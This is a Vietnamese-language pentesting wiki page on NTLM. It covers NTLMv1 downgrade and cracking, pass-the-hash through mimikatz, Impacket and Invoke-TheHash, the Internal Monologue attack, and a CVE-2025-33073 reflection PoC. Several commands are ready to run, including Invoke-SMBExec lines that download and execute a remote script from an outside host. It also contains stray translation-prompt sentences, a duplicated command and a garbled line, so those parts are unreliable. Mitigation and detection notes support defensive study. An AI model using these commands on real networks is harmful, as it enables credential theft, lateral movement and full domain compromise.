# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Thông tin cơ bản

Trong các môi trường đang vận hành **Windows XP và Server 2003**, hash LM (Lan Manager) được sử dụng, mặc dù chúng được biết đến rộng rãi là có thể bị xâm phạm dễ dàng. Một hash LM cụ thể, `AAD3B435B51404EEAAD3B435B51404EE`, cho biết LM không được sử dụng; đây là hash của chuỗi rỗng.

Theo mặc định, giao thức xác thực **Kerberos** là phương thức chính được sử dụng. NTLM (NT LAN Manager) được dùng trong một số trường hợp cụ thể: không có Active Directory, domain không tồn tại, Kerberos gặp trục trặc do cấu hình không đúng, hoặc khi kết nối bằng địa chỉ IP thay vì hostname hợp lệ.

Sự hiện diện của header **"NTLMSSP"** trong các gói mạng cho biết đang diễn ra quá trình xác thực NTLM.

Các giao thức xác thực LM, NTLMv1 và NTLMv2 được hỗ trợ bởi một DLL cụ thể nằm tại `%windir%\Windows\System32\msv1\_0.dll`.

**Các điểm chính**:

- Hash LM dễ bị tấn công; hash LM rỗng (`AAD3B435B51404EEAAD3B435B51404EE`) cho biết LM không được sử dụng.
- Kerberos là phương thức xác thực mặc định; NTLM chỉ được dùng trong một số điều kiện nhất định.
- Có thể nhận diện các gói xác thực NTLM qua header "NTLMSSP".
- Các giao thức LM, NTLMv1 và NTLMv2 được hỗ trợ bởi tệp hệ thống `msv1\_0.dll`.

## LM, NTLMv1 và NTLMv2

Bạn có thể kiểm tra và cấu hình giao thức sẽ được sử dụng:

### GUI

Chạy _secpol.msc_ -> Chính sách cục bộ -> Tùy chọn bảo mật -> Bảo mật mạng: Mức xác thực LAN Manager. Có 6 mức (từ 0 đến 5).

![LM, NTLMv1 và NTLMv2 - GUI: Chạy secpol.msc - Chính sách cục bộ - Tùy chọn bảo mật - Bảo mật mạng: Mức xác thực LAN Manager. Có 6 mức (từ 0 đến 5)](<../../images/image (919).png>)

### Registry

Thao tác này sẽ đặt mức 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Các giá trị có thể có:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Lược đồ xác thực NTLM Domain cơ bản

1. **Người dùng** nhập **thông tin xác thực**
2. Máy client **gửi yêu cầu xác thực**, bao gồm **tên domain** và **tên người dùng**
3. **Server** gửi **challenge**
4. **Client mã hóa** **challenge** bằng hash của mật khẩu làm khóa rồi gửi lại dưới dạng response
5. **Server gửi** cho **Domain Controller** **tên domain, tên người dùng, challenge và response**. Nếu **không có** Active Directory được cấu hình hoặc tên domain trùng với tên server, thông tin xác thực sẽ được **kiểm tra cục bộ**.
6. **Domain Controller kiểm tra xem mọi thứ có chính xác không** rồi gửi thông tin cho server

**Server** và **Domain Controller** có thể tạo **Secure Channel** thông qua server **Netlogon**, vì Domain Controller biết mật khẩu của server (mật khẩu này nằm trong db **NTDS.DIT**).

### Lược đồ xác thực NTLM cục bộ

Quá trình xác thực giống như đã nêu **ở trên, nhưng** **server** biết **hash của người dùng** đang cố xác thực, được lưu trong tệp **SAM**. Vì vậy, thay vì hỏi Domain Controller, **server sẽ tự kiểm tra** xem người dùng có thể xác thực hay không.

### NTLMv1 Challenge

**Độ dài challenge là 8 byte** và **response dài 24 byte**.

**Hash NT (16 byte)** được chia thành **3 phần, mỗi phần 7 byte** (7B + 7B + (2B+0x00\*5)): **phần cuối được điền bằng các số 0**. Sau đó, **challenge** được **mã hóa riêng** bằng từng phần và các byte đã mã hóa **được nối lại**. Tổng cộng: 8B + 8B + 8B = 24 byte.

**Vấn đề**:

- Thiếu **tính ngẫu nhiên**
- Có thể **tấn công riêng từng phần** để tìm NT hash
- **DES có thể bị crack**
- Khóa thứ **3** luôn được cấu thành từ **5 số 0**.
- Với **cùng một challenge**, **response** sẽ **giống nhau**. Vì vậy, bạn có thể gửi cho nạn nhân chuỗi "**1122334455667788**" làm **challenge** rồi tấn công response bằng cách sử dụng **rainbow table được tính toán trước**.

### Tấn công NTLMv1

Unconstrained delegation ít phổ biến hơn trong các môi trường hiện đại, nhưng vẫn có thể lạm dụng một dịch vụ **Print Spooler** có thể truy cập để buộc xác thực đến một host như vậy.

Bạn có thể lạm dụng một số thông tin xác thực/phiên mà bạn đã có trên AD để **yêu cầu máy in xác thực** với một **host do bạn kiểm soát**. Sau đó, dùng `metasploit auxiliary/server/capture/smb` hoặc `responder`, bạn có thể **đặt challenge xác thực thành 1122334455667788**, bắt lại lần xác thực và nếu nó được thực hiện bằng **NTLMv1**, bạn sẽ có thể **crack nó**.\
Nếu dùng `responder`, bạn có thể thử **dùng flag `--lm`** để thử **hạ cấp** **quá trình xác thực**.\
_Lưu ý rằng kỹ thuật này yêu cầu quá trình xác thực phải dùng NTLMv1 (NTLMv2 không hợp lệ)._

Hãy nhớ rằng máy in sẽ dùng tài khoản máy tính trong quá trình xác thực, còn tài khoản máy tính sử dụng **mật khẩu dài và ngẫu nhiên** mà bạn **có thể sẽ không crack được** bằng các **từ điển** thông thường. Tuy nhiên, quá trình xác thực **NTLMv1** **dùng DES** ([xem thêm thông tin tại đây](#ntlmv1-challenge)), vì vậy bạn có thể crack nó bằng một số dịch vụ chuyên dụng để crack DES (ví dụ: [https://crack.sh/](https://crack.sh) hoặc [https://ntlmv1.com/](https://ntlmv1.com)).

### Tấn công NTLMv1 bằng hashcat

NTLMv1 cũng có thể bị tấn công bằng [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), công cụ chuyển các thông điệp NTLMv1 đã bắt được sang những định dạng phù hợp với Hashcat.<sup>[[1]](#references)</sup>

Lệnh

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

sẽ xuất ra nội dung bên dưới:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Bạn chưa cung cấp nội dung cần đưa vào tệp.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Chạy hashcat (tốt nhất là chạy phân tán thông qua một công cụ như hashtopolis), vì nếu không việc này sẽ mất vài ngày.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Trong trường hợp này, chúng ta biết mật khẩu của nó là password, nên sẽ gian lận để minh họa:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Bây giờ chúng ta cần sử dụng hashcat-utilities để chuyển đổi các khóa DES đã crack thành các phần của hash NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Vui lòng gửi phần nội dung cần dịch.

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Kết hợp chúng lại với nhau:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### Thử thách NTLMv2

**Độ dài challenge là 8 byte** và **có 2 response được gửi**: Một response dài **24 byte** và response **còn lại** có độ dài **thay đổi**.

**Response đầu tiên** được tạo bằng cách mã hóa **chuỗi** gồm **client và domain** bằng **HMAC_MD5**, sử dụng **hash MD4** của **NT hash** làm **key**. Sau đó, **kết quả** được dùng làm **key** để mã hóa **challenge** bằng **HMAC_MD5**. Tiếp theo, **client challenge dài 8 byte** được thêm vào. Tổng cộng: 24 B.

**Response thứ hai** được tạo bằng cách sử dụng **nhiều giá trị** (một client challenge mới, **timestamp** để tránh **replay attack**...)

Nếu bạn có **PCAP chứa một phiên trao đổi xác thực thành công**, hãy trích xuất domain, username, server challenge và NTLMv2 response, định dạng capture cho Hashcat, rồi dùng mode `5600` để thử khôi phục mật khẩu. Bài hướng dẫn thực hành được lưu trữ vẫn giữ nguyên quy trình trích xuất các trường trong packet, còn các ví dụ của Hashcat xác định định dạng hiện được chấp nhận.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Khi đã có hash của nạn nhân**, bạn có thể dùng nó để **mạo danh** nạn nhân.\
Bạn cần dùng một **tool** để **thực hiện** **xác thực NTLM bằng** **hash** đó, **hoặc** bạn có thể tạo một **sessionlogon** mới và **inject** **hash** đó vào **LSASS**, để bất cứ khi nào **xác thực NTLM được thực hiện**, **hash đó sẽ được sử dụng.** Đây là cách mà mimikatz thực hiện.

**Xin lưu ý, bạn cũng có thể thực hiện các cuộc tấn công Pass-the-Hash bằng tài khoản Computer.**

### **Mimikatz**

**Cần chạy với quyền administrator**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Thao tác này khởi chạy một tiến trình dưới tài khoản người dùng cục bộ hiện tại, trong khi LSASS liên kết thông tin xác thực được cung cấp với phiên đăng nhập mạng đi ra của nó. Sau đó, bạn có thể truy cập tài nguyên mạng bằng tài khoản người dùng được cung cấp, tương tự như `runas /netonly`, mà không cần biết mật khẩu dạng plaintext.

### Pass-the-Hash từ Linux

Bạn có thể thực thi mã trên các máy Windows bằng Pass-the-Hash từ Linux.\
[**Xem các ví dụ thực hành thực thi Pass-the-Hash bằng Impacket PsExec.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Các công cụ Impacket đã biên dịch cho Windows

Bạn có thể tải xuống[ các binary Impacket cho Windows tại đây](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Trong trường hợp này, bạn cần chỉ định một lệnh; cmd.exe và powershell.exe không hợp lệ để lấy shell tương tác)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Còn nhiều binary Impacket khác...

### Invoke-TheHash

Bạn có thể lấy các script powershell tại đây: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Hàm này kết hợp các chế độ trước đó. Bạn có thể truyền **nhiều máy chủ**, loại trừ các mục tiêu đã chọn và chọn _SMBExec, WMIExec, SMBClient,_ hoặc _SMBEnum_. Nếu chọn **SMBExec** hoặc **WMIExec** mà không có tham số _**Command**_, hàm chỉ kiểm tra xem bạn có đủ quyền hay không.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Cần chạy với quyền quản trị viên**

Công cụ này thực hiện tương tự mimikatz (chỉnh sửa bộ nhớ LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Thực thi từ xa Windows thủ công bằng tên người dùng và mật khẩu


{{#ref}}
../lateral-movement/
{{#endref}}

## Trích xuất thông tin xác thực từ máy chủ Windows

Để biết thêm thông tin, xem [**Đánh cắp thông tin xác thực Windows**](../stealing-credentials/README.md).

## Tấn công Internal Monologue

Internal Monologue Attack là kỹ thuật trích xuất thông tin xác thực bí mật, cho phép kẻ tấn công lấy NTLM hash từ máy của nạn nhân **mà không tương tác trực tiếp với tiến trình LSASS**. Khác với Mimikatz, vốn đọc hash trực tiếp từ bộ nhớ và thường bị các giải pháp bảo mật đầu cuối hoặc Credential Guard chặn, cuộc tấn công này tận dụng **các lệnh gọi cục bộ đến gói xác thực NTLM (MSV1_0) thông qua Security Support Provider Interface (SSPI)**. Trước tiên, kẻ tấn công **hạ cấp các thiết lập NTLM** (ví dụ: LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) để cho phép NetNTLMv1. Sau đó, chúng mạo danh các token người dùng hiện có lấy được từ những tiến trình đang chạy và kích hoạt xác thực NTLM cục bộ để tạo phản hồi NetNTLMv1 bằng một challenge đã biết.<sup>[[4]](#references)</sup>

Sau khi thu thập các phản hồi NetNTLMv1 này, kẻ tấn công có thể nhanh chóng khôi phục NTLM hash gốc bằng **rainbow table được tính toán trước**, từ đó thực hiện các cuộc tấn công Pass-the-Hash để di chuyển ngang. Điểm quan trọng là Internal Monologue Attack vẫn khó bị phát hiện vì không tạo lưu lượng mạng, chèn code hay kích hoạt việc dump bộ nhớ trực tiếp, khiến các biện pháp phòng thủ khó phát hiện hơn so với những phương pháp truyền thống như Mimikatz.

Nếu NetNTLMv1 không được chấp nhận do các chính sách bảo mật bắt buộc, kẻ tấn công có thể không lấy được phản hồi NetNTLMv1.

Để xử lý trường hợp này, công cụ Internal Monologue đã được cập nhật: Công cụ tự động lấy token máy chủ bằng `AcceptSecurityContext()` để vẫn **thu thập phản hồi NetNTLMv2** nếu NetNTLMv1 không thành công. Dù NetNTLMv2 khó crack hơn nhiều, nó vẫn mở ra khả năng thực hiện các cuộc tấn công relay hoặc brute-force offline trong một số trường hợp hạn chế.

Có thể tìm thấy PoC tại **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay và Responder

**Đọc hướng dẫn chi tiết hơn về cách thực hiện các cuộc tấn công này tại đây:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Phân tích NTLM challenge từ bản capture mạng

**Bạn có thể dùng** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* qua SPN được tuần tự hóa (CVE-2025-33073)

Windows có một số biện pháp giảm thiểu nhằm ngăn chặn các cuộc tấn công *reflection*, trong đó một xác thực NTLM (hoặc Kerberos) bắt nguồn từ máy chủ bị chuyển tiếp trở lại **chính** máy chủ đó để giành quyền SYSTEM.

Microsoft đã vô hiệu hóa hầu hết các chuỗi khai thác công khai bằng MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) và các bản vá về sau. Tuy nhiên, **CVE-2025-33073** cho thấy vẫn có thể vượt qua các biện pháp bảo vệ bằng cách khai thác cách **SMB client cắt ngắn Service Principal Name (SPN)** có chứa thông tin target-info được *marshal* (tuần tự hóa).<sup>[[5]](#references)[[6]](#references)</sup>

### Tóm tắt nhanh về lỗi
1. Kẻ tấn công đăng ký một **DNS A-record** có nhãn mã hóa SPN được marshal – ví dụ:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Nạn nhân bị buộc phải xác thực với hostname đó (PetitPotam, DFSCoerce, v.v.).
3. Khi SMB client truyền chuỗi đích `cifs/srv11UWhRCAAAAA…` đến `lsasrv!LsapCheckMarshalledTargetInfo`, lệnh gọi `CredUnmarshalTargetInfo` **loại bỏ** blob đã tuần tự hóa, chỉ còn lại **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (hoặc thành phần tương đương của Kerberos) lúc này xem đích là *localhost* vì phần hostname rút gọn khớp với tên máy tính (`SRV1`).
5. Do đó, máy chủ đặt `NTLMSSP_NEGOTIATE_LOCAL_CALL` và chèn **access token SYSTEM của LSASS** vào context (với Kerberos, một khóa subsession được đánh dấu SYSTEM sẽ được tạo).
6. Chuyển tiếp xác thực này bằng `ntlmrelayx.py` **hoặc** `krbrelayx.py` sẽ cấp đầy đủ quyền SYSTEM trên chính máy chủ đó.<sup>[[5]](#references)</sup>

### PoC nhanh
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Bản vá & Biện pháp giảm thiểu
* Bản vá KB cho **CVE-2025-33073** bổ sung bước kiểm tra trong `mrxsmb.sys::SmbCeCreateSrvCall`, chặn mọi kết nối SMB có đích chứa thông tin được marshal (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Bắt buộc **SMB signing** trên các đích SMB relay. Với các đích khác, hãy đánh giá yêu cầu signing hoặc Extended Protection riêng của giao thức đó và mức bản vá; chỉ SMB signing không quyết định được liệu có thể relay HTTPS WinRM hay không.
* Giám sát các bản ghi DNS có dạng `*<base64>...*` và chặn các vector ép xác thực (PetitPotam, DFSCoerce, AuthIP...).

### Ý tưởng phát hiện
* Bản ghi bắt gói mạng có `NTLMSSP_NEGOTIATE_LOCAL_CALL` khi IP máy khách ≠ IP máy chủ.
* Kerberos AP-REQ chứa khóa subsession và principal của máy khách trùng với hostname.
* Các sự kiện đăng nhập SYSTEM Windows 4624/4648 ngay sau đó là các lần ghi SMB từ xa từ cùng một máy chủ.<sup>[[5]](#references)</sup>

Tên DNS chứa thông tin đích được tuần tự hóa cũng có thể hướng xác thực bị ép đến kẻ tấn công để thực hiện **cross-protocol relay** đến endpoint web enrollment của AD CS. Đây là kết quả riêng biệt với reflection trên cùng máy chủ: cần đánh giá độc lập các điều kiện enrollment của [ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), quyền ghi DNS, đường ép xác thực và mức bản vá của đích.

Để xem biến thể reflection cục bộ **tháng 3 năm 2026**, khai thác **SMB arbitrary ports** và **TCP connection reuse** để đạt `NT AUTHORITY\SYSTEM`, xem:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – Công cụ đa năng NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hash mẫu của Hashcat – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – Tiện ích Pass The Hash cho PowerShell](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Tấn công Internal Monologue: lấy NTLM Hash mà không truy cập LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection đã chết, NTLM Reflection muôn năm!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Crack NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
